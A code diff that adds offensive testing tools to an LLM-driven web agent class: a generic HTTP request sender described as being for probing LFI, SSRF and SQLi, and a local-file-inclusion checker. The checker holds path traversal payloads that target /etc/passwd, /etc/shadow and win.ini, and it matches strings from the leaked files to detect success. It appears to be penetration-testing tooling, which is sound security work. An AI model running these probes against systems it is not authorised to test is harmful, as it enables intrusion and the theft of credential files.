@@ -276,6 +276,16 @@ class WebDriverAgent(AgentWithHistory[dict, str]):
                 name="login",
                 description="Perform login on a web application. This is more reliable than manually inputting credentials. Args: login_url (str) - URL of login page, username (str), password (str), username_selector (str) - CSS selector for username field (default: input[name='username']), password_selector (str) - CSS selector for password field (default: input[name='password']), submit_selector (str) - CSS selector for submit button (default: button[type='submit']). Returns: Login result with current URL."
             ),
+            StructuredTool.from_function(
+                func=self._send_http_request,
+                name="send_http_request",
+                description="Send HTTP request (GET/POST/PUT/DELETE) to test API vulnerabilities like LFI, SSRF, SQLi. Args: url (str), method (str) - HTTP method, data (str) - JSON data for POST/PUT, headers (str) - JSON headers. Returns: HTTP response with status and body."
+            ),
+            StructuredTool.from_function(
+                func=self._check_lfi_vulnerability,
+                name="check_lfi_vulnerability",
+                description="Check for Local File Inclusion (LFI) / Path Traversal vulnerability by attempting to read sensitive files. Args: base_url (str) - Target URL with parameter placeholder like http://target/api?file=, payloads (str) - comma-separated LFI payloads like '../../../etc/passwd,....//....//etc/passwd'. Returns: LFI test results."
+            ),
         ]
         
         return tools
@@ -632,11 +642,119 @@ class WebDriverAgent(AgentWithHistory[dict, str]):
         except Exception as e:
             return f"Error in file upload CSRF: {str(e)}"
     
+    def _send_http_request(self, url: str, method: str = "GET", data: str = None, headers: str = None) -> str:
+        """
+        Send HTTP request for testing API vulnerabilities (LFI, SSRF, SQLi, etc.)
+        Uses requests library for flexibility.
+        """
+        try:
+            import requests
+            import json
+            
+            # 解析 headers
+            req_headers = {}
+            if headers:
+                try:
+                    req_headers = json.loads(headers)
+                except:
+                    pass
+            
+            # 解析 data
+            req_data = None
+            if data:
+                try:
+                    req_data = json.loads(data)
+                except:
+                    req_data = data
+            
+            # 发送请求
+            method = method.upper()
+            if method == "GET":
+                resp = requests.get(url, headers=req_headers, timeout=30, verify=False)
+            elif method == "POST":
+                resp = requests.post(url, json=req_data if isinstance(req_data, dict) else None, 
+                                    data=req_data if isinstance(req_data, str) else None,
+                                    headers=req_headers, timeout=30, verify=False)
+            elif method == "PUT":
+                resp = requests.put(url, json=req_data, headers=req_headers, timeout=30, verify=False)
+            elif method == "DELETE":
+                resp = requests.delete(url, headers=req_headers, timeout=30, verify=False)
+            else:
+                return f"Unsupported method: {method}"
+            
+            # 检查响应内容是否包含敏感信息（LFI 检测）
+            body = resp.text[:2000]  # 限制长度
+            lfi_indicators = ['root:', '/bin/bash', 'daemon:', 'www-data', '[boot loader]', 'Windows Registry']
+            lfi_detected = any(ind in body for ind in lfi_indicators)
+            
+            return f"""HTTP Response:
+Status: {resp.status_code}
+Headers: {dict(list(resp.headers.items())[:5])}
+Body (first 2000 chars): {body}
+{'🚨 LFI DETECTED! Sensitive file content found!' if lfi_detected else ''}"""
+        
+        except Exception as e:
+            return f"HTTP request error: {str(e)}"
+    
+    def _check_lfi_vulnerability(self, base_url: str, payloads: str = None) -> str:
+        """
+        Check for LFI/Path Traversal vulnerability by testing common payloads.
+        """
+        try:
+            import requests
+            
+            # 默认 LFI payloads
+            default_payloads = [
+                '../../../etc/passwd',
+                '....//....//....//etc/passwd',
+                '../../../../../../../etc/passwd',
+                '..%2f..%2f..%2fetc/passwd',
+                '..\\..\\..\\windows\\win.ini',
+                '../../../etc/shadow',
+            ]
+            
+            test_payloads = payloads.split(',') if payloads else default_payloads
+            results = []
+            vulnerable = False
+            
+            for payload in test_payloads:
+                payload = payload.strip()
+                # 替换 URL 中的占位符或直接附加
+                if '{payload}' in base_url:
+                    test_url = base_url.replace('{payload}', payload)
+                elif '=' in base_url:
+                    test_url = base_url + payload
+                else:
+                    test_url = base_url + '/' + payload
+                
+                try:
+                    resp = requests.get(test_url, timeout=10, verify=False)
+                    body = resp.text[:1000]
+                    
+                    # 检查 LFI 成功指标
+                    lfi_indicators = ['root:', '/bin/bash', 'daemon:', 'www-data', 
+                                     '[boot loader]', 'Windows Registry', '[extensions]']
+                    if any(ind in body for ind in lfi_indicators):
+                        vulnerable = True
+                        results.append(f"🚨 VULNERABLE with payload '{payload}': Found sensitive content")
+                        results.append(f"   Response snippet: {body[:300]}")
+                    else:
+                        results.append(f"Tested '{payload}': Status {resp.status_code}, no sensitive content")
+                except Exception as e:
+                    results.append(f"Error testing '{payload}': {str(e)}")
+            
+            summary = "🚨 LFI VULNERABILITY CONFIRMED!" if vulnerable else "No LFI vulnerability detected"
+            return f"{summary}\n\nTest Results:\n" + "\n".join(results)
+        
+        except Exception as e:
+            return f"LFI check error: {str(e)}"
+    
     def get_cost(self, *args, **kw) -> float:
         total_cost = 0
         for model_name, token_usage in self.token_usage.items():
             total_cost += token_usage.get_costs(model_name)['total_cost']
         return total_cost
+
     
     def __del__(self):
         """Cleanup on deletion"""
